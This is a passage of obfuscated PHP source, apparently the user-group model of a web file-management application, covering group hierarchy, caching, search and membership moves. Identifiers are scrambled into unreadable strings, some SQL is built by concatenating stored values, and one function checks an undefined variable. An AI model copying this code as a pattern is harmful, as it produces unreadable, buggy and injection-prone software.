$this->_clearCache($âªíŠÅ’[$Â§íÚñ˜[1894]]); } } private function _clearCache($Ûã²¬úä) { $©¸Ó¨±¶ =& $_SERVER[èùÙ¹Ïö]; $this->cacheFunctionClear($©¸Ó¨±¶[1976], $Ûã²¬úä); $this->cacheFunctionClear($©¸Ó¨±¶[1977], $Ûã²¬úä); } private function _changeChildLevel($¢èªĞ™Œ, $½ñÎÈ­†, $ìà´Íˆ² = false) { $âÄŒ“Àï =& $_SERVER[èùÙ¹Ïö]; $Êş¼ÎìÕ = $¢èªĞ™Œ[$âÄŒ“Àï[556]] . $¢èªĞ™Œ[$âÄŒ“Àï[1894]] . $âÄŒ“Àï[50]; $¶ß™ğô– = $½ñÎÈ­†[$âÄŒ“Àï[556]] . $½ñÎÈ­†[$âÄŒ“Àï[1894]] . $âÄŒ“Àï[50] . $¢èªĞ™Œ[$âÄŒ“Àï[1894]] . $âÄŒ“Àï[50]; if ($ìà´Íˆ²) { $¶ß™ğô– = $½ñÎÈ­†[$âÄŒ“Àï[556]] . $½ñÎÈ­†[$âÄŒ“Àï[1894]] . $âÄŒ“Àï[50]; } $ÎíœöİÌ = array($âÄŒ“Àï[623] => array($âÄŒ“Àï[583], $¢èªĞ™Œ[$âÄŒ“Àï[556]] . $¢èªĞ™Œ[$âÄŒ“Àï[1894]] . $âÄŒ“Àï[584])); $Øêê„ñ = array($âÄŒ“Àï[623] => array($âÄŒ“Àï[632], "\x72\x65\160\x6c\141\x63\145\50\x70\x61\x72\145\156\x74\114\145\x76\145\154\54\47{$Êş¼ÎìÕ}\47\54\x27{$¶ß™ğô–}\x27\x29")); $this->_clearChildrenCache($¢èªĞ™Œ); $this->where($ÎíœöİÌ)->data($Øêê„ñ)->save(); } public function setNamePinyin($è²ê×Ö, $‚åœö = false) { $Ú””òÚ =& $_SERVER[èùÙ¹Ïö]; if (!$‚åœö) { $Ú¸Ğ˜Ô‡ = $this->getInfoSimple($è²ê×Ö); $‚åœö = $Ú¸Ğ˜Ô‡[$Ú””òÚ[32]]; } if (!Input::check($‚åœö, $Ú””òÚ[626])) { $this->metaSet($è²ê×Ö, $Ú””òÚ[508], null); $this->metaSet($è²ê×Ö, $Ú””òÚ[507], null); return; } $¿”€èİí = array($Ú””òÚ[508] => str_replace($Ú””òÚ[53], $Ú””òÚ[12], Pinyin::get($‚åœö)), $Ú””òÚ[507] => Pinyin::get($‚åœö, $Ú””òÚ[627])); $this->metaSet($è²ê×Ö, $¿”€èİí); } protected function groupStatus($§é±˜Ş, $®€ªµ¾º) { $ËÓÕ©èˆ =& $_SERVER[èùÙ¹Ïö]; $÷¼ÎÀÍ† = $this->getInfoSimple($§é±˜Ş); if (!$÷¼ÎÀÍ†) { return !1; } if ($®€ªµ¾º == $ËÓÕ©èˆ[90]) { $àÇğŞü“ = $this->parentLevelArray($÷¼ÎÀÍ†[$ËÓÕ©èˆ[556]]); } else { $‘æ·¾¾ = array($ËÓÕ©èˆ[623] => array($ËÓÕ©èˆ[583], $÷¼ÎÀÍ†[$ËÓÕ©èˆ[556]] . $÷¼ÎÀÍ†[$ËÓÕ©èˆ[1894]] . $ËÓÕ©èˆ[584])); $àÇğŞü“ = $this->where($‘æ·¾¾)->field($ËÓÕ©èˆ[1894])->select(); $àÇğŞü“ = array_to_keyvalue($àÇğŞü“, $ËÓÕ©èˆ[12], $ËÓÕ©èˆ[1894]); } $àÇğŞü“[] = $÷¼ÎÀÍ†[$ËÓÕ©èˆ[1894]]; $¥Å¶†Ô = array(); foreach ($àÇğŞü“ as $§é±˜Ş) { $¥Å¶†Ô[] = array($ËÓÕ©èˆ[1894] => $§é±˜Ş, $ËÓÕ©èˆ[96] => $ËÓÕ©èˆ[790], $ËÓÕ©èˆ[420] => $®€ªµ¾º); $this->_clearCache($§é±˜Ş); } return Model($ËÓÕ©èˆ[1983])->addAll($¥Å¶†Ô, array(), !0); } protected function groupRemove($’­°íªË, $„Îå·ş = false) { $›â–ıÆÓ =& $_SERVER[èùÙ¹Ïö]; $ÁÛĞá€ø = array($›â–ıÆÓ[1894] => $’­°íªË); $ñ¶…„ìı = $this->where($ÁÛĞá€ø)->find(); if (!$ñ¶…„ìı || $ñ¶…„ìı[$›â–ıÆÓ[182]] == 0) { return !1; } if (!$„Îå·ş) { $ÊÂæÀÛ¢ = $this->getInfoSimple($ñ¶…„ìı[$›â–ıÆÓ[182]]); $this->_changeChildLevel($ñ¶…„ìı, $ÊÂæÀÛ¢, !0); $this->where(array($›â–ıÆÓ[182] => $’­°íªË))->save(array($›â–ıÆÓ[182] => $ñ¶…„ìı[$›â–ıÆÓ[182]])); $this->_clearCache($ÊÂæÀÛ¢[$›â–ıÆÓ[1894]]); } Model($›â–ıÆÓ[1983])->where($ÁÛĞá€ø)->delete(); Model($›â–ıÆÓ[1984])->where($ÁÛĞá€ø)->delete(); Model($›â–ıÆÓ[865])->groupRootRemove($’­°íªË); $this->_clearCache($ñ¶…„ìı[$›â–ıÆÓ[182]]); return $this->where($ÁÛĞá€ø)->delete(); } protected function groupSort($Ÿ›äÛíÁ) { $â£½»ÖÃ =& $_SERVER[èùÙ¹Ïö]; $Œå•à€ = array(); foreach ($Ÿ›äÛíÁ as $ÛöäªÄâ => $ˆÁ×İŸ‰) { $Œå•à€[] = array($â£½»ÖÃ[1894], $ˆÁ×İŸ‰, $â£½»ÖÃ[1918], $ÛöäªÄâ + 1); } $this->saveAll($Œå•à€); } public function listData() { $ÑÖÛ¢í = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÑÖÛ¢í[$_SERVER[èùÙ¹Ïö][415]]); return $ÑÖÛ¢í; } private function _makeOrder($Æ‰åõ½ß = '') { $Šá¿ÏÃ =& $_SERVER[èùÙ¹Ïö]; $Õ«æ‚Ùø = array($Šá¿ÏÃ[1894], $Šá¿ÏÃ[32], $Šá¿ÏÃ[1883], $Šá¿ÏÃ[217]); $ˆ’–¼ä› = array($Šá¿ÏÃ[493] => $Šá¿ÏÃ[494], $Šá¿ÏÃ[495] => $Šá¿ÏÃ[496]); $ÀÒÒ±é = Input::get($Šá¿ÏÃ[500], $Šá¿ÏÃ[7], $Šá¿ÏÃ[1898], $Õ«æ‚Ùø); $ö¡˜•¼¢ = Input::get($Šá¿ÏÃ[501], $Šá¿ÏÃ[7], $Šá¿ÏÃ[1985], array($Šá¿ÏÃ[1985], $Šá¿ÏÃ[495])); $ö¡˜•¼¢ = $ˆ’–¼ä›[$ö¡˜•¼¢]; $Æ‰åõ½ß = $Æ‰åõ½ß . "{$ÀÒÒ±é}\x20{$ö¡˜•¼¢}\x2c\40\x67\162\157\x75\160\x49\104\40\x61\x73\143"; return $this->order($Æ‰åõ½ß); } public function listChild($ãˆÅş•Ì) { $äíİà =& $_SERVER[èùÙ¹Ïö]; $ï®í¡™ = $this->where(array($äíİà[182] => $ãˆÅş•Ì))->_makeOrder()->selectPage(200); $this->_listDataApply($ï®í¡™[$äíİà[415]]); return $ï®í¡™; } public function listChildIds($ÆÇ¹ÌµÙ) { $Ãİ€Ìı =& $_SERVER[èùÙ¹Ïö]; if (is_string($Í†Í¿Øİ)) { $ÆÇ¹ÌµÙ = explode($Ãİ€Ìı[50], $ÆÇ¹ÌµÙ); } $Í©ÁÑÚ™ = $this->where(array($Ãİ€Ìı[1894] => array($Ãİ€Ìı[7], $ÆÇ¹ÌµÙ)))->field($Ãİ€Ìı[1986])->select(); if (!$Í©ÁÑÚ™) { return !1; } $¿Í³‹ÌÙ = array(); foreach ($Í©ÁÑÚ™ as $ğòÜ¸×„) { $¿Í³‹ÌÙ[] = "\x73\145\154\145\143\x74\x20\x67\x72\x6f\x75\160\x49\104\40\x66\162\157\155\x20\140\x67\162\x6f\x75\x70\x60\x20\x77\x68\x65\x72\x65\40\x70\141\x72\x65\156\x74\114\x65\x76\x65\x6c\40\x6c\x69\x6b\145\x20\47{$ğòÜ¸×„[$Ãİ€Ìı[556]]}{$ğòÜ¸×„[$Ãİ€Ìı[1894]]}\x2c\45\47"; } $¿Í³‹ÌÙ = implode($Ãİ€Ìı[1987], $¿Í³‹ÌÙ); $Í©ÁÑÚ™ = $this->query($¿Í³‹ÌÙ); if (!$Í©ÁÑÚ™) { return array(); } $ÆÇ¹ÌµÙ = array_to_keyvalue($Í©ÁÑÚ™, $Ãİ€Ìı[12], $Ãİ€Ìı[1894]); return array_unique($ÆÇ¹ÌµÙ); } public function listByID($ıØ»ƒ§ø) { $ï°Ğ˜ =& $_SERVER[èùÙ¹Ïö]; if (!$ıØ»ƒ§ø) { return array(); } $áß§Ê‚È = array($ï°Ğ˜[1894] => array($ï°Ğ˜[7], $ıØ»ƒ§ø)); $¨¹µà¿Ì = $this->where($áß§Ê‚È)->select(); $¨¹µà¿Ì = array_sort_keep($¨¹µà¿Ì, $ï°Ğ˜[1894], $ıØ»ƒ§ø); $this->_listDataApply($¨¹µà¿Ì); return $¨¹µà¿Ì; } public function listSearch($éŸï˜Œ) { $Ğ×¯ƒ¨Ã =& $_SERVER[èùÙ¹Ïö]; $¶²úÓà² = $éŸï˜Œ[$Ğ×¯ƒ¨Ã[1988]]; $®Ì×Ò¡œ = isset($éŸï˜Œ[$Ğ×¯ƒ¨Ã[1989]]) ? $éŸï˜Œ[$Ğ×¯ƒ¨Ã[1989]] : !1; if (!trim($¶²úÓà²)) { return !1; } $¶²úÓà² = str_replace($Ğ×¯ƒ¨Ã[1990], $Ğ×¯ƒ¨Ã[1991], $¶²úÓà²); $´ñ§¸ËÆ = array($Ğ×¯ƒ¨Ã[1894] => array($Ğ×¯ƒ¨Ã[429], "{$¶²úÓà²}\45"), $Ğ×¯ƒ¨Ã[32] => array($Ğ×¯ƒ¨Ã[429], "\x25{$¶²úÓà²}\x25"), $Ğ×¯ƒ¨Ã[1046] => $Ğ×¯ƒ¨Ã[1992]); if ($®Ì×Ò¡œ) { $Ìş×ç›Ò = $this->getInfoSimple($®Ì×Ò¡œ); $±›¹§ ¾ = $Ìş×ç›Ò[$Ğ×¯ƒ¨Ã[556]] . $®Ì×Ò¡œ . $Ğ×¯ƒ¨Ã[584]; $´ñ§¸ËÆ = array($´ñ§¸ËÆ, array($Ğ×¯ƒ¨Ã[556] => array($Ğ×¯ƒ¨Ã[429], $±›¹§ ¾))); } $´ñ§¸ËÆ = $this->parseWhereLike($´ñ§¸ËÆ); $€ËÅ = $this->_makeOrder()->where($´ñ§¸ËÆ)->selectPage(20); $€ËÅ = $€ËÅ ? $€ËÅ : array($Ğ×¯ƒ¨Ã[415] => array(), $Ğ×¯ƒ¨Ã[412] => array()); if (!$€ËÅ || count($€ËÅ[$Ğ×¯ƒ¨Ã[415]]) < 5 && Input::check($¶²úÓà², $Ğ×¯ƒ¨Ã[364])) { $É®ñ´¢ˆ = $this->groupChildrenAll($®Ì×Ò¡œ); $É¬à’Š = $this->_searchFromMeta($Ğ×¯ƒ¨Ã[507], $¶²úÓà², 10, $É®ñ´¢ˆ); $ˆ»êóÃ° = $this->_searchFromMeta($Ğ×¯ƒ¨Ã[508], $¶²úÓà², 10, $É®ñ´¢ˆ); $Œ¡¹èëÎ = array_merge($É¬à’Š, $ˆ»êóÃ°, $€ËÅ[$Ğ×¯ƒ¨Ã[415]]); $€ËÅ[$Ğ×¯ƒ¨Ã[415]] = array_unique_by_key($Œ¡¹èëÎ, $Ğ×¯ƒ¨Ã[1894]); $€ËÅ[$Ğ×¯ƒ¨Ã[412]][$Ğ×¯ƒ¨Ã[413]] = count($€ËÅ[$Ğ×¯ƒ¨Ã[415]]); $€ËÅ[$Ğ×¯ƒ¨Ã[412]][$Ğ×¯ƒ¨Ã[414]] = ceil($€ËÅ[$Ğ×¯ƒ¨Ã[412]][$Ğ×¯ƒ¨Ã[413]] / $€ËÅ[$Ğ×¯ƒ¨Ã[412]][$Ğ×¯ƒ¨Ã[409]]); } $this->_listDataApply($€ËÅ[$Ğ×¯ƒ¨Ã[415]]); return $€ËÅ; } protected function groupChildrenAll($«Òíğ§Î) { $ùø”ã“‘ =& $_SERVER[èùÙ¹Ïö]; if (!$«Òíğ§Î) { return !1; } if (!is_array($«Òíğ§Î)) { $«Òíğ§Î = array($«Òíğ§Î); } $ª–“½ = $«Òíğ§Î; foreach ($«Òíğ§Î as $ Áëôä) { $ö½¡ƒÎŠ = $this->getInfoSimple($ Áëôä); $ÌéÇîú§ = array($ùø”ã“‘[556] => array($ùø”ã“‘[429], $ö½¡ƒÎŠ[$ùø”ã“‘[556]] . $ Áëôä . $ùø”ã“‘[584])); $øÊò´²™ = $this->field($ùø”ã“‘[1894])->where($ÌéÇîú§)->select(); $ª–“½ = array_merge($ª–“½, array_to_keyvalue($øÊò´²™, $ùø”ã“‘[12], $ùø”ã“‘[1894])); } return array_unique($ª–“½); } private function _searchFromMeta($ÕóÎÕ›, $İ…¢ó¿¼, $€£ÀĞ, $®–¡ôŒâ) { $¦ªµÀõÍ =& $_SERVER[èùÙ¹Ïö]; $İ…¢ó¿¼ = strtolower($İ…¢ó¿¼); $­ñú‰¢€ = array($¦ªµÀõÍ[96] => $ÕóÎÕ›, $¦ªµÀõÍ[420] => array($¦ªµÀõÍ[429], "\45{$İ…¢ó¿¼}\45")); $­ñú‰¢€ = $this->parseWhereLike($­ñú‰¢€); if ($®–¡ôŒâ) { $­ñú‰¢€[$¦ªµÀõÍ[1894]] = array($¦ªµÀõÍ[7], $®–¡ôŒâ); } $õÈßŒÄ = Model($¦ªµÀõÍ[1993])->where($­ñú‰¢€)->limit($€£ÀĞ)->select(); if (!$õÈßŒÄ) { return array(); } $õÈßŒÄ = array_to_keyvalue($õÈßŒÄ, $¦ªµÀõÍ[12], $¦ªµÀõÍ[1894]); $ íŠÀËÆ = $this->where(array($¦ªµÀõÍ[1982] => array($¦ªµÀõÍ[7], $õÈßŒÄ)))->select(); if (!$ íŠÀËÆ) { return array(); } return $ íŠÀËÆ; } protected function _listDataApplyItem($¥ÜéÊ„) { $­Úğ˜ = array($¥ÜéÊ„); $this->_listDataApply($­Úğ˜); return $­Úğ˜[0]; } protected function _listDataApply(&$ÍåõëÃñ) { $˜ß¡øì„ =& $_SERVER[èùÙ¹Ïö]; if (!$ÍåõëÃñ) { return; } $¶ÄÙƒëš = array_to_keyvalue($ÍåõëÃñ, $˜ß¡øì„[12], $˜ß¡øì„[1894]); $this->_listAppendChildren($ÍåõëÃñ); $this->_listAppendChildrenMember($ÍåõëÃñ); $this->_listAppendMeta($ÍåõëÃñ, $¶ÄÙƒëš); $this->_listAppendParent($ÍåõëÃñ); $this->_listAppendSourceRoot($ÍåõëÃñ, $¶ÄÙƒëš); } private function _listAppendChildren(&$ıœ˜ù©ß) { $ıàÉ¯Ç¦ =& $_SERVER[èùÙ¹Ïö]; $ˆ÷ßš£Á = array_to_keyvalue($ıœ˜ù©ß, $ıàÉ¯Ç¦[12], $ıàÉ¯Ç¦[1894]); $é¥Î„ªó = array($ıàÉ¯Ç¦[182] => array($ıàÉ¯Ç¦[7], $ˆ÷ßš£Á)); $âòÌÑş = array($ıàÉ¯Ç¦[182], $ıàÉ¯Ç¦[1994] => $ıàÉ¯Ç¦[536]); $¸Ìøï = $this->field($âòÌÑş)->where($é¥Î„ªó)->group($ıàÉ¯Ç¦[182])->select(); $Ó¶èÄ¬ = array_to_keyvalue($¸Ìøï, $ıàÉ¯Ç¦[182], $ıàÉ¯Ç¦[536]); foreach ($ıœ˜ù©ß as &$ú´ä—Ï”) { $ò¸ş¸Õ = $ú´ä—Ï”[$ıàÉ¯Ç¦[1894]]; $ú´ä—Ï”[$ıàÉ¯Ç¦[1995]] = isset($Ó¶èÄ¬[$ò¸ş¸Õ]) ? intval($Ó¶èÄ¬[$ò¸ş¸Õ]) : !1; } unset($ú´ä—Ï”); } private function _listAppendChildrenMember(&$»šÜô) { $´•Ö‰ã÷ =& $_SERVER[èùÙ¹Ïö]; $¯º³¢ÓÜ = array_to_keyvalue($»šÜô, $´•Ö‰ã÷[12], $´•Ö‰ã÷[1894]); $ºÜ¸Ş“† = array($´•Ö‰ã÷[1894] => array($´•Ö‰ã÷[7], $¯º³¢ÓÜ)); $ã­Â ¡é = array($´•Ö‰ã÷[1894], $´•Ö‰ã÷[1994] => $´•Ö‰ã÷[536]); $¿‘¯Ù˜ä = Model($´•Ö‰ã÷[1984])->field($ã­Â ¡é)->where($ºÜ¸Ş“†)->group($´•Ö‰ã÷[1894])->select(); $ˆÎ˜Êéš = array_to_keyvalue($¿‘¯Ù˜ä, $´•Ö‰ã÷[1894], $´•Ö‰ã÷[536]); foreach ($»šÜô as &$‰Ş‰çÛá) { $»¼ÔËñ¯ = $‰Ş‰çÛá[$´•Ö‰ã÷[1894]]; $‰Ş‰çÛá[$´•Ö‰ã÷[1996]] = isset($ˆÎ˜Êéš[$»¼ÔËñ¯]) ? intval($ˆÎ˜Êéš[$»¼ÔËñ¯]) : !1; } unset($‰Ş‰çÛá); } private function _listAppendMeta(&$Ûí¶²€À, $Ã¡Å¦ñŸ) { $ê½òí¾ä =& $_SERVER[èùÙ¹Ïö]; $¾Äºó®Ì = array($ê½òí¾ä[1894] => array($ê½òí¾ä[7], $Ã¡Å¦ñŸ)); $ª¼•„ã¢ = Model($ê½òí¾ä[1983])->where($¾Äºó®Ì)->select(); $ª¼•„ã¢ = array_to_keyvalue_group($ª¼•„ã¢, $ê½òí¾ä[1894]); foreach ($ª¼•„ã¢ as &$“£Ç¦Ã) { $“£Ç¦Ã = array_to_keyvalue($“£Ç¦Ã, $ê½òí¾ä[96], $ê½òí¾ä[420]); } unset($“£Ç¦Ã); foreach ($Ûí¶²€À as &$Áö³ÜÕè) { $Áö³ÜÕè[$ê½òí¾ä[509]] = array(); if (isset($ª¼•„ã¢[$Áö³ÜÕè[$ê½òí¾ä[1894]]])) { $Áö³ÜÕè[$ê½òí¾ä[509]] = $ª¼•„ã¢[$Áö³ÜÕè[$ê½òí¾ä[1894]]]; } } unset($Áö³ÜÕè); } protected function parentLevelArray($³¹‰äæÛ) { $‰Ó÷Î¼¯ =& $_SERVER[èùÙ¹Ïö]; $³¹‰äæÛ = explode($‰Ó÷Î¼¯[50], trim($³¹‰äæÛ, $‰Ó÷Î¼¯[50])); $³¹‰äæÛ = array_remove_value($³¹‰äæÛ, $‰Ó÷Î¼¯[214]); return $³¹‰äæÛ; } protected function parentInGroup($ò¹¨àÖ³, $×°¶İâ) { $ÖÎ†•çİ =& $_SERVER[èùÙ¹Ïö]; $¨€ûŸ¹Ó = $this->getInfoSimple($ò¹¨àÖ³); if (!$¨€ûŸ¹Ó) { return !0; } $¹¾½æÚ« = $this->parentLevelArray($¨€ûŸ¹Ó[$ÖÎ†•çİ[556]]); $¹¾½æÚ«[] = $ò¹¨àÖ³; foreach ($¹¾½æÚ« as $ò¹¨àÖ³) { if (in_array($ò¹¨àÖ³ . $ÖÎ†•çİ[12], $×°¶İâ)) { return !0; } } return !1; } private function _listAppendParent(&$ü—…ø„¨) { $Ì·ÇõØ¡ =& $_SERVER[èùÙ¹Ïö]; $ĞœÕ£ğ€ = array(); foreach ($ü—…ø„¨ as &$ŞÅ‡°ëë) { $ĞœÕ£ğ€[$ŞÅ‡°ëë[$Ì·ÇõØ¡[1894]]] = $ŞÅ‡°ëë[$Ì·ÇõØ¡[32]]; $Éİè¼›ç = $this->parentLevelArray($ŞÅ‡°ëë[$Ì·ÇõØ¡[556]]); foreach ($Éİè¼›ç as $›ºî‹Ê‡) { if (!isset($ĞœÕ£ğ€[$›ºî‹Ê‡])) { $ĞœÕ£ğ€[$›ºî‹Ê‡] = 0; } } } unset($ŞÅ‡°ëë); foreach ($ĞœÕ£ğ€ as $‚¼—äÇ => $ÒŞÛ„î) { if ($ÒŞÛ„î) { continue; } $„Â¼Ôû = $this->getInfoSimple($‚¼—äÇ); $ĞœÕ£ğ€[$‚¼—äÇ] = $„Â¼Ôû[$Ì·ÇõØ¡[32]]; } $¦›Ê‘Ô½ = $GLOBALS[$Ì·ÇõØ¡[6]][$Ì·ÇõØ¡[91]][$Ì·ÇõØ¡[1997]]; if ($GLOBALS[$Ì·ÇõØ¡[539]] == $Ì·ÇõØ¡[90]) { $¦›Ê‘Ô½ = !1; } foreach ($ü—…ø„¨ as &$ŞÅ‡°ëë) { $Éİè¼›ç = $this->parentLevelArray($ŞÅ‡°ëë[$Ì·ÇõØ¡[556]]); $÷ª‚’Şë = $Ì·ÇõØ¡[12]; foreach ($Éİè¼›ç as $‚¼—äÇ => $›ºî‹Ê‡) { if ($¦›Ê‘Ô½ && $‚¼—äÇ == 0) { continue; } $÷ª‚’Şë .= $ĞœÕ£ğ€[$›ºî‹Ê‡] . $Ì·ÇõØ¡[8]; } if ($Éİè¼›ç) { $÷ª‚’Şë .= $ŞÅ‡°ëë[$Ì·ÇõØ¡[32]]; } $ŞÅ‡°ëë[$Ì·ÇõØ¡[561]] = str_replace($Ì·ÇõØ¡[564], $Ì·ÇõØ¡[8], $÷ª‚’Şë); } unset($ŞÅ‡°ëë); } private function _listAppendSourceRoot(&$ÄÕ¡ˆÓ, $‘ºÑƒÇã) { $’ÈÀ–á =& $_SERVER[èùÙ¹Ïö]; $İ™ïÍ = Model($’ÈÀ–á[865])->listSourceRoot(SourceModel::TYPE_GROUP, $‘ºÑƒÇã); $İ™ïÍ = array_to_keyvalue($İ™ïÍ, $’ÈÀ–á[541]); $İ™ïÍ = array_remove_key($İ™ïÍ, $’ÈÀ–á[541]); foreach ($ÄÕ¡ˆÓ as &$Ì´†‚ü÷) { $Ì´†‚ü÷[$’ÈÀ–á[89]] = $İ™ïÍ[$Ì´†‚ü÷[$’ÈÀ–á[1894]]] ? $İ™ïÍ[$Ì´†‚ü÷[$’ÈÀ–á[1894]]] : array(); } unset($Ì´†‚ü÷); } protected function groupMerge($×õ÷Å¿Ğ) { $×õ÷Å¿Ğ = array_values(array_unique($×õ÷Å¿Ğ)); $ùñÁÒêĞ = array(); for ($—ÅÁı‡‡ = 0; $—ÅÁı‡‡ < count($×õ÷Å¿Ğ); $—ÅÁı‡‡++) { $ëşÉÖÂ = !1; for ($æµ‰ÃÏ = 0; $æµ‰ÃÏ < count($×õ÷Å¿Ğ); $æµ‰ÃÏ++) { if ($—ÅÁı‡‡ == $æµ‰ÃÏ) { continue; } if ($this->isParentOf($×õ÷Å¿Ğ[$æµ‰ÃÏ], $×õ÷Å¿Ğ[$—ÅÁı‡‡])) { $ëşÉÖÂ = !0; break; } } if (!$ëşÉÖÂ) { $ùñÁÒêĞ[] = $×õ÷Å¿Ğ[$—ÅÁı‡‡]; } } return $ùñÁÒêĞ; } protected function isParentOf($ıĞÖ¦Š», $”¬—®ı¦) { $ùºê£ÕÈ =& $_SERVER[èùÙ¹Ïö]; if (!$ıĞÖ¦Š» || !$”¬—®ı¦ || $ıĞÖ¦Š» == $”¬—®ı¦) { return !1; } $É¹ÕøÚÏ = $this->getInfoSimple($ıĞÖ¦Š»); $ˆâ–ëú› = $this->getInfoSimple($”¬—®ı¦); $ÏóÜÆÏÚ = $É¹ÕøÚÏ[$ùºê£ÕÈ[556]] . $ıĞÖ¦Š» . $ùºê£ÕÈ[50]; if (substr($ˆâ–ëú›[$ùºê£ÕÈ[556]], 0, strlen($ÏóÜÆÏÚ)) == $ÏóÜÆÏÚ) { return !0; } return !1; } public function groupShowRoot($Àò¹Óµ, $Ô‘Õ¶Œ– = false) { $æîÀ˜ø¥ =& $_SERVER[èùÙ¹Ïö]; $¹ò‹À¬ = $this->getInfo($Àò¹Óµ); if (!$¹ò‹À¬) { return array(); } $Üß¦‚ğ = $this->parentLevelArray($¹ò‹À¬[$æîÀ˜ø¥[556]]); $ÅÙô¿íŸ = array($Àò¹Óµ); if (count($Üß¦‚ğ) == 0) { return $ÅÙô¿íŸ; } if ($Ô‘Õ¶Œ– && count($Üß¦‚ğ) == 1) { return $ÅÙô¿íŸ; } if (!$¹ò‹À¬[$æîÀ˜ø¥[509]] || !isset($¹ò‹À¬[$æîÀ˜ø¥[509]][$æîÀ˜ø¥[1980]]) || $¹ò‹À¬[$æîÀ˜ø¥[509]][$æîÀ˜ø¥[1980]] == $æîÀ˜ø¥[1949]) { return $this->groupShowRoot($Üß¦‚ğ[count($Üß¦‚ğ) - 1], $Ô‘Õ¶Œ–); } if ($¹ò‹À¬[$æîÀ˜ø¥[509]][$æîÀ˜ø¥[1980]] == $æîÀ˜ø¥[403]) { $·Ğ¿ğ = explode($æîÀ˜ø¥[50], $¹ò‹À¬[$æîÀ˜ø¥[509]][$æîÀ˜ø¥[1981]]); if ($·Ğ¿ğ) { $ÅÙô¿íŸ = array_merge($ÅÙô¿íŸ, $·Ğ¿ğ); } } return $ÅÙô¿íŸ; } protected function resetParentLevel() { $ÏÎÏ±şñ =& $_SERVER[èùÙ¹Ïö]; $§˜¯ÕÊ¸ = $ÏÎÏ±şñ[1894]; $âÂ­¯¹Á = $this->select(); $âÂ­¯¹Á = array_to_keyvalue($âÂ­¯¹Á, $§˜¯ÕÊ¸); foreach ($âÂ­¯¹Á as $„å…ÛÎå) { $ßø¹ú±† = $„å…ÛÎå; $Àôüä²Ñ = array(); while ($ßø¹ú±†[$ÏÎÏ±şñ[182]] != 0) { $Àôüä²Ñ[] = $ßø¹ú±†[$ÏÎÏ±şñ[182]]; $ßø¹ú±† = $âÂ­¯¹Á[$ßø¹ú±†[$ÏÎÏ±şñ[182]]]; } $Àôüä²Ñ[] = 0; $Àôüä²Ñ = $ÏÎÏ±şñ[50] . implode($ÏÎÏ±şñ[50], array_reverse($Àôüä²Ñ)) . $ÏÎÏ±şñ[50]; $this->setNamePinyin($„å…ÛÎå[$§˜¯ÕÊ¸], $„å…ÛÎå[$ÏÎÏ±şñ[32]]); $this->where(array($§˜¯ÕÊ¸ => $„å…ÛÎå[$§˜¯ÕÊ¸]))->save(array($ÏÎÏ±şñ[623] => $Àôüä²Ñ)); } return $âÂ­¯¹Á; } public function groupNameAuto($ÙİÏˆîŠ, $ôÏşß›Œ) { $ÃœÊÃÅ¢ =& $_SERVER[èùÙ¹Ïö]; $ïİŸ¤‘â = $this->where(array($ÃœÊÃÅ¢[447] => $ÙİÏˆîŠ))->getField($ÃœÊÃÅ¢[32], !0); if (!$ïİŸ¤‘â || !in_array($ôÏşß›Œ, $ïİŸ¤‘â)) { return $ôÏşß›Œ; } for ($ı–Éö¦ = 1; $ı–Éö¦ <= count($ïİŸ¤‘â) + 1; $ı–Éö¦++) { $¹Ï¥ø³» = $ôÏşß›Œ . "\50{$ı–Éö¦}\x29"; if (!in_array($¹Ï¥ø³», $ïİŸ¤‘â)) { return $¹Ï¥ø³»; } } } public function groupSwitch($…ñş”É¥, $ƒ¾ö¢¹é) { $¹òÛç™ƒ =& $_SERVER[èùÙ¹Ïö]; $‚‰Ì¿Ğ = array($¹òÛç™ƒ[1894] => array($¹òÛç™ƒ[7], array($…ñş”É¥, $ƒ¾ö¢¹é))); $Ôœ®ÜÑÇ = $this->where($‚‰Ì¿Ğ)->select(); $Ôœ®ÜÑÇ = array_to_keyvalue($Ôœ®ÜÑÇ, $¹òÛç™ƒ[1894]); if (!isset($Ôœ®ÜÑÇ[$…ñş”É¥]) || !isset($Ôœ®ÜÑÇ[$ƒ¾ö¢¹é]) || $Ôœ®ÜÑÇ[$…ñş”É¥][$¹òÛç™ƒ[182]] == 0) { return !1; } $‚‰Ì¿Ğ = array($¹òÛç™ƒ[1894] => $…ñş”É¥); $æÖí¯îŸ = Model($¹òÛç™ƒ[1984])->where($‚‰Ì¿Ğ)->select(); if (!$æÖí¯îŸ) { $æÖí¯îŸ = array(); } foreach ($æÖí¯îŸ as $¹³ÇƒÃ) { $ãÂ¢‡º = $¹³ÇƒÃ[$¹òÛç™ƒ[1696]]; $‚‰Ì¿Ğ = array($¹òÛç™ƒ[1696] => $ãÂ¢‡º, $¹òÛç™ƒ[1894] => $ƒ¾ö¢¹é); $«ÚØ¸ı = Model($¹òÛç™ƒ[1984])->where($‚‰Ì¿Ğ)->find(); if (!$«ÚØ¸ı) { $İÙİûÑ´ = array($ƒ¾ö¢¹é => $¹³ÇƒÃ[$¹òÛç™ƒ[1998]]); Model($¹òÛç™ƒ[570])->userGroupAdd($ãÂ¢‡º, $İÙİûÑ´); } Model($¹òÛç™ƒ[570])->userGroupRemove($ãÂ¢‡º, $…ñş”É¥); } $‚‰Ì¿Ğ = array($¹òÛç™ƒ[180] => 2, $¹òÛç™ƒ[182] => 0, $¹òÛç™ƒ[455] => 1, $¹òÛç™ƒ[541] => array($¹òÛç™ƒ[7], array($…ñş”É¥, $ƒ¾ö¢¹é))); $ç¬Œ»¹Ï = Model($¹òÛç™ƒ[865])->where($‚‰Ì¿Ğ)->field($¹òÛç™ƒ[1999])->select(); $ç¬Œ»¹Ï = array_to_keyvalue($ç¬Œ»¹Ï, $¹òÛç™ƒ[541], $¹òÛç™ƒ[183]); $è¢şÎôæ = !empty($ç¬Œ»¹Ï[$…ñş”É¥]) ? $ç¬Œ»¹Ï[$…ñş”É¥] : !1; if ($è¢şÎôæ) { if (!$ç¬Œ»¹Ï[$ƒ¾ö¢¹é]) { $ç¬Œ»¹Ï[$ƒ¾ö¢¹é] = Model($¹òÛç™ƒ[865])->groupRootAdd($ƒ¾ö¢¹é); } $à½Æ = $ç¬Œ»¹Ï[$ƒ¾ö¢¹é]; $‚‰Ì¿Ğ = array($¹òÛç™ƒ[182] => $è¢şÎôæ); $ç¬Œ»¹Ï = Model($¹òÛç™ƒ[865])->where($‚‰Ì¿Ğ)->field($¹òÛç™ƒ[2000])->select(); if (!$ç¬Œ»¹Ï) { $ç¬Œ»¹Ï = array(); } Model($¹òÛç™ƒ[865])->moveClearAuth = !1; foreach ($ç¬Œ»¹Ï as $´ìäÇÅŒ) { 